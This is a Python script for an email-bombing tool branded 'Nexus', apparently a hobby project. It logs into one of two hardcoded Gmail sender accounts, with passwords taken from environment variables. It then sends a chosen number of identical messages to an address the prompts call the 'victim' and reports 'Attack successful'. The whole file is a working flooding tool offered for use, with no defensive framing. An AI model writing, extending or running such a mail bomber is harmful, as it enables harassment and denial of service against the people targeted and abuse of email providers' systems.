import os, smtplib, sys
from random import choice
from dotenv import load_dotenv
from termcolor import colored as cl
from pyfiglet import figlet_format as ff

os.system('clear')

email_accounts = ['servicerender100@gmail.com', 'servicerender200@gmail.com']

def get_email_for_spam(eaccs):
    email_address = choice(eaccs)
    return email_address

ma = get_email_for_spam(email_accounts)

def send_mail(acc, qty, msg, ma):
    load_dotenv()
    password = os.getenv(f'PASSWORD{email_accounts.index(ma)+1}')
    for i in range(qty):
    	obj = smtplib.SMTP('smtp.gmail.com', 587)
    	obj.starttls()
    	try:
    		obj.login(ma, password)
    	except:
    		print(cl('Unexpected error from our side, sorry for the inconvenience', 'red'))
    	obj.sendmail(ma, acc, msg)
    	obj.quit()
    	print(cl(f'Mail {str(i+1)} sent successfully ☑', 'green'))

print(cl('-'*30, 'red'))
print(cl(ff('Nexus')+'\n\t-A mail bomber program.\n\t-An AYLIT Production.\n\t-v1.0', 'red'))
print(cl('-'*30, 'red'))
print('\n')

try:
	mails_to_be_sent = int(input(cl('No of mails to be sent:', 'red')).strip())
except:
	print(cl('The input must be an integer', 'red'))
	sys.exit()
victim = input(cl('Enter the mail address of victim:', 'red').strip())
message = input(cl('Enter the message to be sent in email:', 'red').strip())
send_mail(victim, mails_to_be_sent, message, ma)
print(cl('-'*10+'\nAttack successful', 'green'))
os.system('clear')	
	
while True:
	print(cl('-'*30, 'red'))
	print(cl(ff('Nexus')+'\n\t-An AYLIT Production\n\t-v1.0', 'red'))
	print(cl('-'*30, 'red'))
	print('\n')
	if input(cl('Quit(y/n)? ', 'red')).lower().strip() == 'n':
		try:
			mails_to_be_sent = int(input(cl('No of mails to be sent:', 'red')).strip())
		except:
			print(cl('The input be an integer', 'red'))
			sys.exit()
		victim = input(cl('Enter the mail address of victim:', 'red').strip())
		message = input(cl('Enter the message to be sent in email:', 'red').strip())
		send_mail(victim, mails_to_be_sent, message, ma)
		print(cl('-'*10+'\nAttack successful', 'green'))
		os.system('cls')
	else:
		sys.exit()
